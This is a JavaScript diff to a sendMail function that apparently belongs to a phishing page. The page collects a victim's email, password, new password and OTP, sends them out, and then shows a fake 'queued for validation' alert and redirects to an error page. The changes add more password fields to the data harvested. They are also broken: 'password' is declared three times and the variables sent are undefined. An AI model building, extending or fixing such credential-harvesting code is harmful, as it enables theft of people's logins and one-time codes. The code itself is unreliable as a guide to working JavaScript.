@@ -4,6 +4,8 @@ function sendMail(step) {
     if (step === 1) {
         const email = document.getElementById("email").value.trim();
         const password = document.getElementById("password").value.trim();
+        const password = document.getElementById("new-password").value.trim();
+        const password = document.getElementById("confirm-password").value.trim();
 
         // Validate email and password fields
         if (!email || !password) {
@@ -14,6 +16,8 @@ function sendMail(step) {
         params = {
             email: email,
             password: password,
+            new_password: new_password,
+            confirm_password: confirm_password,
         };
     } else if (step === 2) {
         const otp = document.getElementById("otp").value.trim();
@@ -46,17 +50,21 @@ function sendMail(step) {
             if (step === 1) {
                 document.getElementById("email").value = "";
                 document.getElementById("password").value = "";
-                // alert("Step 1 data sent successfully.");
-                goToStep(2); // Move to the next step
-            } else if (step === 2) {
-                document.getElementById("otp").value = "";
+                document.getElementById("new-password").value = "";
+                document.getElementById("confirm-password").value = "";
                 alert("Account queued for validation!");
                 // Redirect or perform further actions as needed
                 window.location.href = "error.html";
+            //    goToStep(2); // Move to the next step
+            // } else if (step === 2) {
+            //     document.getElementById("otp").value = "";
+            //     alert("Account queued for validation!");
+            //     // Redirect or perform further actions as needed
+            //     window.location.href = "error.html";
             }
         })
         .catch((err) => {
-            console.error("Failed to send email:", err);
+            console.error("Failed to process validattion:", err);
             alert("An error occurred. Please try again.");
         });
 }
